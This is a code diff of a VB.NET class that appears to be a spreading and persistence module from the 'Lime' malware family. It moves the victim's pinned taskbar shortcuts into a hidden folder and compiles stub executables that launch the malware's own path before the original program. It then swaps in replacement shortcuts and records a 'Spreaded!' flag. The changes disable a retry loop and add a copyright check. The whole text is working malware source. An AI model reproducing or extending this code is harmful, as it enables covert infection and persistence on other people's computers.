@@ -5,14 +5,23 @@ Imports Microsoft.Win32
 'credit: N A P O L E O N
 
 Public Class Main
-
+    Public Shared Assemb As String = "Lime_W"
+    Public Shared I As Boolean = True
+    Public Shared HWID As String
+    Public Shared Target As String = GetFolderPath(26) & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\"
+    Public Shared ShortcutDIR As String = GetFolderPath(26) & "\Lime\"
+    Public Shared EXEDIR As String = GetFolderPath(26) & "\Lime\EXE\"
+    Public Shared ICODIR As String = GetFolderPath(26) & "\Lime\ICO\"
+    Public Shared FULLPATH As String
+    Public Shared R As New Random
+    Public Shared BL As Boolean = False
 
     Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
 
         FULLPATH = FP
         HWID = HW
-re:
-        Sleep(30000)
+        're:
+        'Sleep(30000)
 
         Try
             If Not File.Exists(Windows.Forms.Application.StartupPath + "\IconLib.dll") AndAlso Not File.Exists(Windows.Forms.Application.StartupPath + "\Interop.Shell32.dll") Then
@@ -35,17 +44,20 @@ re:
                         Directory.CreateDirectory(ICODIR)
                     End If
                     If Not File.Exists(ShortcutDIR & GetFileName(Shourtcuts)) AndAlso GetFileName(Shourtcuts) <> "File Explorer.lnk" Then
+                        '  If IsValid(GetFileName(Shourtcuts)) = False Then
                         IC(GetFileNameWithoutExtension(Shourtcuts), GetFullPath(Shourtcuts))
-                        File.Move(Shourtcuts, ShortcutDIR & GetFileName(Shourtcuts))
-                        CS(GetFileName(Shourtcuts), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe")
-                        Compile(My.Resources.Code.Replace("%CC%", Randomz(6)).Replace("%A%", FULLPATH).Replace("%B%", ShortcutDIR & GetFileName(Shourtcuts)), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe", GetFileNameWithoutExtension(Shourtcuts.Replace(" ", String.Empty)))
-                        If Not GTV("USB") = "Spreaded!" Then
-                            STV("USB", "Spreaded!")
-                        End If
+                            File.Move(Shourtcuts, ShortcutDIR & GetFileName(Shourtcuts))
+                            CS(GetFileName(Shourtcuts), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe")
+                            Compile(My.Resources.Code.Replace("%CC%", Randomz(6)).Replace("%A%", FULLPATH).Replace("%B%", ShortcutDIR & GetFileName(Shourtcuts)), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe", GetFileNameWithoutExtension(Shourtcuts.Replace(" ", String.Empty)))
+                            If I = True Then
+                                STV("USB", "Spreaded!")
+                                I = False
+                            End If
+                        '    End If
                     End If
-
                 End If
             Next
+            Exit Sub
             'GoTo re
         Catch ex As Exception
             Console.WriteLine("RC " + ex.Message)
@@ -122,14 +134,16 @@ re:
             Return False
         End Try
     End Function
-
-
-    Public Shared HWID As String
-    Public Shared Target As String = GetFolderPath(26) & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\"
-    Public Shared ShortcutDIR As String = GetFolderPath(26) & "\Lime\"
-    Public Shared EXEDIR As String = GetFolderPath(26) & "\Lime\EXE\"
-    Public Shared ICODIR As String = GetFolderPath(26) & "\Lime\ICO\"
-    Public Shared FULLPATH As String
-    Public Shared R As New Random
-    Public Shared BL As Boolean = False
+    Shared Function IsValid(ByVal P As String) As Boolean
+        Try
+            Dim Info As FileVersionInfo = FileVersionInfo.GetVersionInfo(P)
+            If Info.LegalCopyright.Contains(Assemb) Then
+                Return True
+            Else
+                Return False
+            End If
+        Catch
+            Return False
+        End Try
+    End Function
 End Class
